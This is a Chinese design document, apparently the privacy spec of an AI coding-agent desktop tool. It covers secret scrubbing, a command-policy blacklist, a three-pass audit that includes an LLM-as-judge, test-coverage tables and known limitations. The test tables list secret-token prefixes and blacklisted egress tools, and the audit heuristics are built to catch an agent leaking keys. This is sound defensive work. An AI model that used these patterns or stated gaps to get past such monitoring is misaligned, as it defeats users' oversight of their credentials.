独立于任何 chat session),**只记类别计数 / 字节数 / 路径 / agent /
动作(tokenized / warned / unknown-path),绝不记请求体 / 真值 /
令牌还原值**——「零内容」是硬不变量,网关侧有测试锁死;前端
`auditTypes.ts` 有同形镜像类型。

### 9.1 三层评估

Settings → Audit → "Evaluate" 对保存的会话跑三遍:

**Pass 1 · 规则回放** — 用当前版本的 policy + safety + scrub 规则,
对 recorded `tool-call-decided` 事件重跑。**任何决策 / 阶段 / 理由
的漂移**都会标记 — 规则升级后,过去哪些决策在今天会不一样,立刻可见。

**Pass 2 · 异常启发式**(4 条规则):
- `reader-without-redaction`:`cat` / `head` 等读取类跑了但 scrubber
  没命中(显式 trusted_read 阶段跳过)
- `network-without-redaction`:`curl` 输出 > 200B 但无 redaction
- `env-without-redaction`:`env` 输出含 `KEY=val` 但无 redaction
- `tool-call-without-reasoning-reflection`:thinking 模式开了,但 60s
  窗口内无 reasoning chunk(说明 LLM 发命令前没反思)

**Pass 3 · LLM-as-judge** — 唯一仍用 Vercel AI SDK v6 `streamText`
的代码路径(主 chat 走 Rust)。SDK的自定义fetch通过专用Tauri IPC把有界POST
Chat Completions交Rust代理感知输送,WebView不直接发judge网络请求;缓冲SSE后
仍由SDK解析text/reasoning。仅http(s)、禁redirect、总120s/建连15s、请求≤4MiB、
key≤16KiB、响应累计≤8MiB;取消会中止实际请求,非2xx不回显原始正文或敏感头。SDK失败也仅保留固定类别,禁默认console错误日志;
只有成功结果可显示judge正文/COT。
Judge 永远走 thinking mode —
审计是合规关键行为,不是用户偏好。Judge 自己的 COT 被捕获到
`JudgeResult.cot`,可在 UI 展开查看"评判的为什么"。

### 9.2 为什么需要三层

普通 LLM Agent 的失败模式是"闷声执行,事后才发现错了"。kaya
的设计哲学:你应当能**完整回放** AI 做的每一件事,包括**为什么**
做这件事。审计日志 + 三层评估 = 完整的"事后取证"能力,让"AI 是不是
把我的密钥传出去了"这种怀疑有可验证的答案。

---

## 10. Ollama 路径:推理与对话 / 工具内容零外发

Settings → Provider 选 **Ollama**,启动 `ollama serve`,完全本地推理:

- 推理与对话 / 工具内容不离开你的机器
- 登录后的使用情况心跳与经明确同意的云端 Token 用量上传是独立通道,不受 Provider 选择影响
- 无 API Key 需求
- 审计 / conversation / debug 仍按本机规则落盘
- 适用场景:隐私敏感工作、离线开发

---

## 11. 测试覆盖

### 11.1 Rust 端(`cargo test --lib`)

| 文件 | 测试数 | 锁的不变量 |
|---|---|---|
| `crates/kaya-core/src/llm/scrub.rs` | 164 | 30+ 类 secret 正则 + 整块 PEM 匹配 + 三档严格度映射;2026-08-20 review C3:JSON 形态 `"api_key": "…"` 值引号识别(`scrubs_api_key_json_quoted_value`);v3.0.7(2026-10-08):未闭合 PEM 兜底 / entropy `_`-`-` 扩字符 + UUID 守卫 / 8 条 gitleaks 对齐 pattern / AWS_KEY_RE 与 Bearer 对齐 / `scrub_env_value` / URL 凭据协议扩充;2026-10-08(同批):encoded-secret 解码重扫层 9 fixture(§7.9);2026-10-13(模型网关 T2/T3,158→164):网关规则表导出(`gateway_rules()` 40 条顺序 tripwire + `gateway_high_entropy_hit`)+ parity / 高熵语义测试 |
| `crates/kaya-core/src/llm/policy.rs` | 319 | 3 语义表 + 永久 blacklist + allowlist-miss + 管道分段 + trusted read + trusted download(round-57)+ `..`/前缀相似 escape;2026-08-20 review C1/C2:flag 内联值(`--name=value` / `-eSCRIPT`)+ 管道位显式路径降级 + tr/cut/sort/uniq 误杀回归(2026-09-19 重测,见 §5.1);v3.0.7(2026-10-08):多行分段 / zsh `=(` 与 glob qualifier / brace 拒 / env 前缀危险名 / Select-String fail-closed / Windows 尾随字符 / 凭证目录硬拒上提 / IM 敏感子树拒读;2026-10-08(同批):`ping`/`traceroute`/`nslookup`/`dig`/`host` 移出 METADATA(CVE-2025-55284,§5.1) |
| `crates/kaya-core/src/llm/safety.rs` | 135 | DANGEROUS/REPL/OPERATION + heredoc/$(...)/`...` 递归(2026-10-06 R4 双语化重数:safety 128→135 / policy 257→266) |
| `crates/kaya-core/src/llm/user_input_guard.rs` | 12 | backend 跑同一 pipeline,防 devtools 直 invoke 绕过前端 guard(round-71 +6) |
| `crates/kaya-core/src/agents/config.rs` | 27 | 读-改-写保留未知键 + 按 agent 拒键表(执行 / 提权类)+ **模型身份拒键表 `denied_model_identity_keys`(四 agent,claude-code 另含 `env` 子表 16 键(含思考能力 / effort);2026-09-10)** + codex 的 `model_providers` 已由模型身份拒键整表拦下(`denied_patch_nested` 保留为扩展点,当前恒 `None`)+ 0o600 原子写与旧 0644 收紧(2026-08-20 review C3) |
| `crates/kaya-core/src/llm/agent.rs` + `agent_loop_tests.rs` | 25 + 73 = 98 | abort flag RAII + stream-idle watchdog + debug response guard + run_chat_loop scripted harness(round-117;2026-09-19 补任务队列 dispatch / verify 回合脚本化用例,spec `2026-09-19-agent-task-queue-design.md` 测试一节承诺项)+ debug modelProvider 全域映射锁(2026-09-04 重数,纠正 33 的历史漂移) |
| `crates/kaya-core/src/llm/openai_compatible.rs` | 91 | preset dispatch + thinking_params per provider(含 deepseek-chat 排除;2026-09-04 preset 扩容 Kimi/MiniMax/GLM/OpenCodeZen/Qwen/SiliconFlow 后重数) |
| `crates/kaya-core/src/llm/yunhou_chat.rs` | 93 | 内置 chat 消息转换 / 裁剪 / SSE 解析 / tool 聚合 / 错误映射 / mock 上游端到端(round-138)+ **服务端 tools 上限常量 `MAX_BUILTIN_TOOLS`(=16,桌面裁剪与错误文案的单一来源)** |
| `src-tauri/src/llm_commands.rs::tests` | 73 | wire format 锁:snake_case OK / camelCase MUST fail(防 "undefined" 误诊)+ `chat_args_accepts_builtin_chat_flag`(round-138)+ schedules 字段 wire(2026-09-19 重数,纠正 13 的历史漂移)+ **桌面基础态工具集**(2026-10-22:基础态恒 15 个 / 不可裁工具数 ≤ 内置代理上限 / 基础态漂移检测 missing·unexpected / 环境性缺失豁免 / **漂移 warn 按形态去重** —— 同一形态只报一次,形态变化再报新的)+ **工具裁剪 warn 按形态去重**(`llm_chat.tools_trimmed` 同处置) |
| `crates/kaya-core/src/gateway/` + `crates/kaya-core/tests/gateway_proxy.rs` | 610 + 17 = 627 | 模型网关 Phase 1(2026-10-13,§7.11):内容寻址令牌确定性(同一 secret 两次请求令牌逐字节相同)/ 形状保持 + 单行 alphabet / vault 内存态(4096 条 FIFO) / SSE 跨 chunk 还原 / 三协议直通 + 逐跳头剥离 / 占位符与别名绝不出网关(注入后硬断言)/ 未知路径 D8+E1 / 审计零内容不变量 + 写盘失败跨 sink warn;wiremock 集成 17 条(全链路令牌化往返 / Strict 档 alias 存活 / 502 结构化 / without_url);2026-10-18 PR#107:迟到二次 401 / 刷新失败只按 expected bearer CAS 清理或替换,不覆盖较新凭据 |
| `src-tauri/src/gateway_tauri.rs::tests` | 87 | 网关壳层(2026-10-13):启停互斥串行化 / owner 互斥(blocked fail-closed)/ 端口顺延持久化 / 快照推送与 boot 对账 / wire 形状(snake_case 双包装);2026-10-15 发版重数 17→24;2026-10-18 Phase 3 与 PR#107 竞态回归后 37;2026-10-24 PR#131 复审补迁移版本戳故障注入用例,隐私统计清空计数修复后重数 53;2026-10-25 rebase 后按当前工作树重数 61 |
| `src-tauri/src/model_discovery.rs` | 64 | 在线模型发现(2026-10-17,Phase 2):`{data:[…]}` 唯一形状 / 500 上限 / id trim 与非法字符拒绝 / 重复 id 跳过(不再整单失败) / 2 MiB 有界读 + **只抽取 id 解析**(2026-10-22 起解析前不再 scrub —— 高熵兜底会涂改带日期戳的模型 id,**新增 dated-id 回归测试**)/ **定向 secret 形态 id 拒绝**(2026-10-22 补:窄集合前缀常量 `SECRET_LIKE_ID_PREFIXES` —— `sk-`(覆盖 `sk-proj-` / `sk-ant-` 等变体)/ `ghp_` / `github_pat_` / `glpat-` / `xoxb-` / `xapp-` / `AKIA` / `AIza` / `eyJ` / `hf_` / `npm_` / `shpat_` 等厂商固定前缀,并补齐 Stripe `sk_live_` / `sk_test_` / `rk_live_`、Slack `xoxs-` / `whsec_`、Supabase `sbp_`、Linear `lin_api_`、Notion `ntn_`、PyPI `pypi-`、Tavily `tvly-`、阿里云 `LTAI`、Docker `dckr_pat_`、age `AGE-SECRET-KEY-1` 等厂商前缀;`AccountKey=` 走大小写不敏感表 `SECRET_LIKE_ID_PREFIXES_CASELESS`),另有三条非前缀定向规则(裸 `Bearer`(含可选 `Authorization:` 头名)/ Slack webhook URL / Telegram bot token)+ 一道**不透明 token 保守闸**(长度 ≥32、字符集仅 base64/hex 即不含 `- _ : . /`、且至少含一个数字)与一条 Twilio 精确形态闸(`SK` + 32 位十六进制);命中即**跳过该条 + 计数**(warn 级 app_log `model_fetch_secret_like_id_skipped`,只记计数与 provider id、**不回显 id 原文**),**不整单失败**(一条畸形不能把同一响应里的其余正常模型全灭 —— 整单失败还会触发目录快照回填、把在线发现的模型一并删掉),同一响应里一个可用模型都没有时仍按失败处理;与「去掉 Strict scrub」不矛盾 —— 去掉的是会误伤正常带日期戳 id 的高熵启发式,新增的是**前缀命中 + 形状闸、误伤面接近零**的定向拒绝)/ **新行 thinking 预填**(2026-10-22:目录蒸馏 `thinking: true` 时只在新行预填 `capabilities: ["thinking"]`,存量行不回填;既有行的显式 `thinking` 不被自动合并覆盖)/ 应用代理感知 + 禁 redirect + 10s / 三协议 URL 构造(bare base_url 与 Chat 同口径补 `/v1`;userinfo / query / fragment 拒)/ 鉴权头互斥(Bearer vs `x-api-key`)/ OAuth 预检哨兵归一到 `model_fetch_*` 码;revision 覆盖 OAuth 凭据与模型列表(换号 / 登出 / 模型保存后旧提交 stale),远程 chat·openai 无 key 预检零网络 |
| `crates/kaya-core/src/oauth/`（递归全部模块） | 93 | 供应商 OAuth(2026-10-17,Phase 3):RFC 8628 begin / poll 状态机(authorization_pending / slow_down / denied / expired / 5xx 重试)/ interval 夹取 1–30s + 15min deadline / 响应体 64 KiB 有界 / Kimi 官方常量与**四个** `X-Msh-*` 头(不发 hostname / 型号 / OS 指纹)/ 验证 URL host allowlist / refresh token 轮换与重试 / 401 重试 client / `invalid_grant` 类永久失效与 401·403 分流 / poll 401·403 与 `invalid_client` 终态 / `expires_in` 夹取 30 天 / 凭据端点 https 闸;错误全固定哨兵、device_code / token 不进 Debug / 日志 |
| `src-tauri/src/provider_auth.rs` | 29 | `resolve_bearer` 生命周期(2026-10-17):<300s 临期刷新 / per-provider refresh 单飞(锁内重读,刷新结果替换则直接返回)/ `ForceAfter401` 强制刷新 / refresh 401·403 → 纯内存 expired 标记 / 瞬态失败回旧 token(Automatic)或 `oauth_refresh_failed`(ForceAfter401)/ logout 撤销与在途 refresh 的锁序;二次 401 仅在 rejected bearer 仍为 current 时标 expired;token 只进出 keychain / 内存 |
| `src-tauri/src/provider_oauth.rs` | 30 | OAuth 命令与 flow 生命周期(2026-10-17):start 校验链(provider → auth_kind → preset → 目录可启动,coming / 无 oauth 一律 fail-closed)/ 六态 status 派生(pending / denied / expired / error 终态粘滞;无 entry 时 bundle 存在性 + expired 标记)/ cancel 幂等 / logout 仅本地清凭据 + 库 List 同步 / generation 核对与 `flows.complete` 原子提交线性化点(迟到 flow 写回 fail-closed)/ post_commit 仅成功提交触发 / wire DTO 无 device_code 与 token |
| `src-tauri/src/provider_chat.rs` | 21 | 统一 Chat resolver(2026-10-17,Phase 3 Task 5):`provider_id = None` 旧路径逐字不变 / 库解析 endpoint + 模型可用性(未启用 / 未声明协议族 fail-closed)/ OAuth bearer 注入 + 401 强制刷新重试一次 / api_key 与 oauth 凭据分流(API Key 401 不重放)/ 迟到二次 401 不遮蔽较新凭据;wire 的 api_key / base_url 被忽略 |

计数口径：2026-11-04 对最终实现源码逐文件匹配行首 `#[test]` / `#[tokio::test(...)]` 属性，包含所有平台 cfg；网关递归含 adapters 与私有 TLS 测试（41），610 + 17 = 627，Tauri 87。该数量不是本机或 Windows 实跑通过数。本地完整 Rust 验证用 `npm run test:rust:workspace` 资源锁入口。

**2026-10-30 应用内代理轮的 Shell 隔离不变量测试**:进程 env 前后逐键不变
（`net::proxy::tests::installing_proxy_never_touches_process_env` /
`proxy_tauri::tests::saving_proxy_config_never_touches_process_env`);应用代理
开启时子进程仍看到用户自己 export 的 proxy 值
（`run_shell::tests::run_subprocess_keeps_user_proxy_env_while_app_proxy_is_enabled`）;
两条 source tripwire 锁死泄漏形态 `std::env::set_var` / `CommandBuilder` /
`set_inherited_env` / `shell_profile`
（`net::proxy::tests::proxy_modules_never_write_shell_env` /
`proxy_tauri::tests::proxy_command_layer_never_writes_shell_env`）。代理层
测试计数（2026-11-02 静态实测）:`net/proxy.rs` 37 / `net/proxy_reqwest.rs` 24 /
`net/proxy_ws.rs` 35 / `net/proxy_app_exits_tests.rs` 17 /
`src-tauri/src/proxy_tauri.rs` 57。

> 数字是对上述模块的静态实测,不是估算。改 privacy 相关代码后必须再数一遍
> 并更新本节;不要用一次可能受已知 PTY 并行 flake 影响的 workspace 总数
> 替代模块计数。


### 11.2 TS 端(`npm test`)

- `src/lib/__tests__/scrubber.test.ts` — TS mirror 测试,锁 PEM 整块、
  多 key 独立、public key 不被误判
- `src/lib/__tests__/runShellPolicy.test.ts` — policy TS mirror
- `src/lib/__tests__/safety.test.ts` — safety TS mirror
- `src/lib/__tests__/userInputGuard.test.ts` — `originalBytes` 反映原始
  输入、整块 PEM、emoji 不被切
- `src/lib/__tests__/audit.test.ts` / `auditEval.test.ts` — JSONL recorder
  + 3-pass evaluator
- `tests/e2e/model-provider-discovery.spec.ts`(Playwright,mock shim)—
  在线模型获取的唯一 e2e:保存非空新 key 恰好一次 / 首开未抓取自动一次且
  切走再回不重复 / 失败目录快照兜底(只增不删)+ manual 行不动 / 在线
  删除绑定的 auto 模型 → 绑定收敛 un-apply 与选择器回退 / busy·stale
  reject 静默;反向计数用稳定观察窗(不裸读 invoke 日志)。
- `tests/e2e/model-oauth.spec.ts`(Playwright,mock shim)— 供应商 OAuth
  前端链路:登录 pending(user_code / 复制 / 打开验证页 / 取消)→
  authorized → Chat wire(`provider_id` 存在且 api_key / base_url 不上
  wire)→ 退出登录回 idle 且库条目保留;expired / denied / error 三态
  + 重新登录入口;**OAuth 未开放形态**:出货目录(仅 API Key)下 UI
  不渲染 OAuth 入口,合成 coming fixture 覆盖选项置灰分支,均零
  `provider_oauth_start`;前端请求参数与 localStorage 无 token 字样。
  **边界**:mock 只证明前端编排与 wire 形状,不冒充 Kimi 真机协议兼容性
  / token 生命周期(Rust 侧由 cargo 测试锁);endpoint / key 选择由
  `src-tauri/src/provider_chat.rs` 的 cargo 测试锁定,e2e 不再断言明文
  wire

### 11.3 TS mirror ↔ Rust 同步(关键!)

`src/lib/{safety,runShellPolicy,scrubber}.ts` 是 Rust 端的 **deterministic
replay mirror**,**不是** live gate(实际 live gate 在 Rust 端)。存在的
理由:audit judge Pass 1 重放 recorded `tool-call-decided` 事件时用
TS mirror。**任何 Rust 端规则的修改必须同步改 TS mirror,否则 audit
judge 永远报 decision-drift**(已锁测试,见 `auditEval.test.ts`)。改时:

1. 先改 Rust 端(单测过)
2. 同步改 TS mirror
3. TS mirror 测过
4. 跑 auditEval 测过(Pass 1 漂移 0)
5. 更新 PRIVACY.md / README.md 涉及的部分

### 11.4 已知的高频漂移点

- `aws-access-key` / `github-pat-*` 这类 token 正则的字符类(`[A-Za-z0-9]`
  vs `[A-Za-z0-9_]` 漂移过两次,各锁了一个 round 的回归测试)
- PEM 类型变体(round-5 加 `ENCRYPTED`,round-7 加 `private key PRIVATE KEY`,
  每次都新加 BEGIN/END alternation pair)
- 命名映射(前端的 `strict` ≠ Rust 的 `Strict`,故意反着)
- placeholder 格式(round-19 统一到 `[REDACTED:<category>]`,前是
  Rust `[<category>]` / TS `[REDACTED:<category>]` 双格式)

---

原生运行时配置的真机测试只允许临时 HOME/XDG/CLI 数据根、白名单人工配置、fake key 与本次回环 mock。测试入口先验证 OS 文件/网络/Mach 隔离，失败则连 CLI `--version` 也不启动；不读取真实 Keychain 或用户配置，不用真实账号绕过启动门槛，子进程由 finally kill+wait 回收。当前严格策略在本机探针启动时失败，因此未取得隔离 CLI 版本或字段生效证明。Kimi Permission 在后端执行表、适配器和前端控件统一 unsupported、零按键（包括离开 Plan）；仅保留其它已有核验通道的字段，不把安装包元信息或静态字符串当作新真机证据。

## 12. 已知限制 / 不做

- **多层嵌套编码仍是已知边界(2026-10-08 改写)** — 单层 base64 / hex
  编码的 secret 已由 encoded-secret 解码重扫层覆盖(§7.9:解码后过
  Tier-0 具体模式集,命中才整段 redact);**双层及以上嵌套编码**
  (base64(base64(secret)) 等)刻意不递归(深度 1),仍是已知限制。
  scrubber 终究是 regex 系的 defense-in-depth:不指望它兜底,指望
  policy 黑名单把出口命令先拒了
- **LLM 上下文在 LLM 端** — 我们 scrub 了发出去的内容,但 LLM 提供商
  自己的服务端日志 / 缓存策略我们管不着。选 Ollama 路径可彻底消除这一层
- **API Key 仍在 LLM 鉴权 header** — 这是协议设计,不可避免。但不进
  request body,审计日志也不记
- **trusted read 一旦放行就是整文件** — 你放一个 1MB log 进
  `~/.kaya/`,LLM 能 `cat` 整篇。scrubber 仍跑,但如果
  log 里有 1MB 随机数据,sed/grep 会把整篇带进 LLM context 撑爆 token
  预算 — 后果是任务失败,不是泄漏
- **用户在 terminal 里直接输入的命令不受任何门拦截** — 这是设计决策
  (用户的 shell 用户的责任),不是漏洞
- **图片能力刻意收窄(2026-10-02)** — 不做拖拽上传 / 图片标注 / 图片生成
  与编辑;不做自动粘贴进 agent 输入框(terminal_write 是文本通道,物理不
  支持)——「发送给 agent」按钮只把 `~/.kaya/tmp-images/` 下的**绝对路径**
  文本交接给被驾驶的编程 agent,由它自行读文件,agent 是否支持读图不在
  kaya 判定范围内
- **Linux 桌面版未发布** — 桌面版当前为 macOS 与 Windows x64(Windows
  移植 2026-08-24 起,Windows 语义层见 §5.3);Linux 仅 kaya-cli 支持
- **代理不做系统代理 / PAC / 自动探测(2026-10-30)** — 只有「关闭」与
  「手动代理」两种状态;不读取 macOS 系统代理设置、不解析 PAC、不按域名
  自动选不同代理,也不提供忽略 TLS 证书错误的开关。应用代理只作用于
  kaya 自身出站请求,与 Shell / Terminal 完全隔离(§2 代理边界)
- **网关启停救不了运行中的 agent(2026-10-13,声明为预期行为)** —
  退出写回 / boot 对账修复的是「未来启动的 agent」的配置;网关停止
  或 kaya 崩溃时**正在运行的** agent 进程(env 已注入网关地址)仍指向
  死端口,请求失败直到用户重启该 agent。kaya 被强kill时连写回机会都
  没有,死配置窗口 = 下次启动 kaya 时 boot 对账自愈(§7.11)。另外
  网关 Phase 1 的 PII 检测**不含 IP 地址类**(拍板偏差,理由与后果见
  §7.11 末段)

---

## 13. 修改隐私相关代码时的检查清单

每改一处,都至少要:

- [ ] Rust 端 + TS mirror **同时改**(否则 audit judge Pass 1 报漂移)
- [ ] 涉及新 secret 类别:加 cargo 单测 + vitest 单测
- [ ] 涉及 scrub level 映射:`scrub.rs::frontend_name_to_scrub_level`
      头注释要更新
- [ ] 涉及 placeholder 格式:`scrub.rs` 和 `scrubber.ts` 两处 placeholder
      构造点同步
- [ ] 涉及用户输入 pipeline 改:`userInputGuard.ts` (前端) +
      `user_input_guard.rs` (Rust) + `input_guard.rs` (CLI) 三处同步
- [ ] 涉及记忆子系统(`crates/kaya-core/src/memory/`、memory_* 命令、
      检索/注入外发面):同步更新 §8.1,`docs/PRIVACY.en.md` 双语对齐
- [ ] 涉及模型网关(`crates/kaya-core/src/gateway/`、
      `src-tauri/src/gateway_tauri.rs`):令牌化检测规则与 Chat scrub
      同源(`scrub.rs::gateway_rules`,规则演进仍守「Rust 表 + TS 镜像
      同 PR」纪律);**审计零内容**、鉴权头占位 token 拒发、自定义头的占位符检查与 Content 顶层模型别名改写是
      硬不变量;Metadata 正文直通例外必须如实披露,不能宣称所有别名均不会上行。改动必须保住相关
      的测试;同步更新 §7.11(含 en 镜像)
- [ ] 改完跑 `npm test && npm run test:rust:workspace` 全绿
- [ ] 更新 `docs/PRIVACY.md` 涉及的部分(如果改了"已知限制"或"测试覆盖",
      文档要反映)
- [ ] 发版前(每版一次,2026-10-09 起):对照 **OWASP Top 10 for Agentic
      Applications** 当前版(ASI01–10,2025-12 首版,配套资源季度更新,
      genai.owasp.org——对照时用当前版,不要凭记忆)逐条过本版 diff 的
      新增能力面(新工具 / 新渠道 / 新落盘域 / 新外发路径);发现的差距
      修复或写明理由记录在案(release skill 步骤 1 同源执行)

---

## 14. 一句话总结

> kaya **运行在你的 Mac / Windows PC** 上,**默认** LLM 看不到文件内容,
> 内置 AI 的输入与工具执行受五道关卡约束,安全网关只保护明确接入的 Agent 模型请求。
> 本机状态不自动云同步;已启用功能的外发路径、内容落盘例外和审计覆盖缺口均在本文列明。
> **Privacy First 是结构性的,不是放开任意访问的配置项。**

### 版本范围复审补强(2026-10-22)

- `agents/`、`agent-state/`、`gateway/`、`agent-config-snapshots/`、`agent-tune/`、`usage/` 加入控制面拒写目录:trusted download 与 shell 重定向一律拒写,包括可含 hooks 的 Claude 启动隔离配置。macOS/Windows 的目录名比较忽略大小写,防同一目录的大小写别名绕过。Rust 与 TS policy 镜像同步,内置数据目录清单有拒写完整性测试。
- `agents/`、`gateway/` 与 `agent-config-snapshots/` 加入 IM 渠道回合敏感拒读子树(该闸只在 IM 回合置位,远程 / peer 不在内),`model-library.json`、原子写临时文件 `model-library.kaya-tmp` 及备份/迁移留底也拒读,阻止经 `run_shell` 读取隐私明细、用户 env 与自定义请求头原值;沿用敏感读闸对显式路径、管道操作数、重定向输入、内容计数和隐式递归 cwd 的覆盖。桌面/CLI trusted-read 的既有授权范围不变。明细查询命令不主动把原文注入 LLM;本机用户显式通过 trusted-read 读取仍服从该既有边界。
- 云端用量上传的**本机状态**(`~/.kaya/usage/upload-<部署>.json` 及其原子写临时文件 `usage/upload-<部署>.json.tmp`,含 account_id / device_id / 供应商维度映射;**2026-10-30 起按部署分** —— cn / intl 两套独立的云端与账号各持一份,旧版共享的 `usage/upload.json` 只作一次性迁移源)加入 **IM 渠道回合**的敏感拒读名单(该闸只在 IM 回合置位;远程 SPA 发的回合复用桌面上下文、peer 回合不注册 `run_shell`,均不在内 —— 见 §4.7 的「如实口径」):trusted-read 命中这两个**精确路径**一律 `[policy:trusted-read-miss]` 拒,大小写口径沿用同一套(macOS / Windows 小写化、Linux 大小写敏感)。**`usage/` 子树按「只放行用量事件文件」逐路径判定**:目录本体(显式路径 `grep -r x ~/.kaya/usage` 的递归读、cwd = 该目录的裸递归搜索)、状态文件、原子写临时文件、跨进程锁文件,以及一切会匹配到状态文件的**通配形态**(`~/.kaya/usage/*` / `upload.json*` / `upload-*.json*` —— 词法层无法展开通配符,只禁精确路径挡不住)一律拒;**用量事件文件**(`usage/events-YYYY-MM-DD.jsonl`,只含计数与 provider / model 标识)照常可读,整个 `usage/` 子树**不进**敏感目录清单。桌面/CLI trusted-read 的既有授权范围不变。
- 网关恢复次数记录在后台等待同请求的 tokenize 记录写完再追加,不阻塞响应;测试可禁用明细落盘或注入临时目录,避免写开发者真实数据。

- API key 更新事务：更换/清除前先在模型库写入仅含 provider id 的 `credential_pending` 标记,成功提交 provider 时同次清标。失败回滚并读回;未确认恢复则保留标记,重启后也拒绝出站读取,须显式重新输入或清除 key 后保存。远程 BYOK 回退及前端密钥回填(包括审计 judge 所用内存 key)同受此闸约束;安全拒读时不回落 legacy/内存 key。已存供应商普通编辑不重写自动回填 key。沿用单进程模型库锁契约,不宣称跨进程原子提交。
- 凭据与目标一致性补强：锁外 API key 请求准备在同一模型库锁内校验 provider 快照并读 key；长活 IM/辅助 client 每次请求重解析目标。生产 OAuth 刷新/提交在取消等待后继续持锁落定，退出登录须等待提交后删除；已开始的系统凭据写入不声称可被强停。

统一Keychain vault的新版本写入在 `~/.kaya/vault-locks/` 持久控制文件上使用跨进程文件锁，按实际service/account（含隔离dev namespace）区分；目录0700、文件0600，文件名仅编码非敏感namespace，不含凭据。锁覆盖版本检查、迁移与全部legacy源清理、读取、修改、写入和读回重试，等待至多2秒，失败不写vault；锁文件不删除，进程退出自动释放。此目录属于Rust/TS policy拒写控制面，并从诊断导出排除。旧二进制不遵守新锁协议，跨旧版本并发仍无法提供CAS保证。vault继续使用flat string-map与字符串schema元数据；未知版本或坏版本类型阻断写入，不按损坏空map自愈。

当前源码属性计数已同步上表；历史重数段落仅记录当时快照。

### 当前本机凭据、恢复与运行时边界

用户输入渠道的 bracketed paste 恢复仅维护有限的标记前缀、开闭/不确定状态和单个实例身份，均为纯内存元数据；不保留粘贴正文，不落盘、不进入日志、审计、IPC 回包或 sessionStorage。仅独立人工单字节 Ctrl+C 可在同实例存在可能未闭合粘贴时，于同一恢复票、lease 和 writer 锁内发送固定 `ESC[201~` + Ctrl+C；等待旧在途写结束，真实写入及 flush 成功后仅按原票 epoch 解除隔离，失败或超时继续隔离。跨 target 不补旧结束标记，不重放正文、不补 Enter。此状态只覆盖用户输入渠道，不承诺跟踪全部 writer；恢复表示协议结束与取消键已递交，不证明应用已清空输入。

模型库的 `.bak`、`.migrated-v1-*`、`.migrated-protocols-*` 三类留底都可能含端点、自定义头等准敏感原文；仅留本机，用户可手动删除，当前没有自动保留期。OAuth 包的可选 `account_id` 仅用于 ChatGPT，随 access/refresh token 包同存系统 keychain，不只在内存；不出凭据 IPC、不进日志或审计。

消息可选 `turn_identity` 是精确生命周期锚，只有 Tauri stamping；本机四个恢复 IPC 使用它与活动 lease、32 个完成投影核对，不靠 TTL 猜活回合。部分快照未列 holder 不表示其已终止。此恢复 metadata 保留在本地，provider 消息经显式转换不携带它；store 仍 v64。记忆的 `ownership_epoch`、`semantic_claims` 与 `origin_operations` 只记录精确所有权和旧操作负事实；purge 仍擦正文和旧版本，tombstone 保留操作身份以拒绝旧队列，不自动重领已明确解挂的成员。

运行时配置每字段最多32步、总96步，共享45秒请求预算；15秒字段预算只取剩余时间。身份与目录取证同 deadline 单飞，诊断另有单飞等待；即时投影仅用内存 registry 与 verified 字段并 scrub，常规 watcher 仍补全库与 hook。读失败清 verified/UI 投影而保留 roster 身份；IdleProof 仅内存绑定实例、帧和 resize，无年龄门槛。

用户输入 session 级 decimal u64 序号、同步 Channel 仅真实写完确认；后端 FIFO 64票/256KiB、调用50秒，sessionStorage 最多128条 sessionId/seq 无正文元数据。gap/overflow/未知 cleanup 隔离后仅显式手动独立 Ctrl+C 成功或真实 PTY 替换恢复，旧票/旧 Ctrl+C 不写新实例。Windows 新PTY须在返回 session_id / 注册写通道前，由同源单飞 watcher 在最多5秒内提供该 session/domain 的首个有效身份样本；失败仅清理本次会话并进入前端可重连路径，initialCommand 保留。迟到旧域样本不能就绪新域，ready 不解除既有隔离；运行中身份未知仍暂拒，2秒取证后再 Ctrl+C；未真机或交叉编译。Kimi Permission backend/adapter/UI 均 unsupported、零按键；Kimi model/thinking 与 Claude 三项保留，OpenCode model/Codex 三项仍 unsupported。严格隔离探针 SIGABRT、零 CLI 启动，隔离版本未取得，无 session-only 或双实例真机证明。
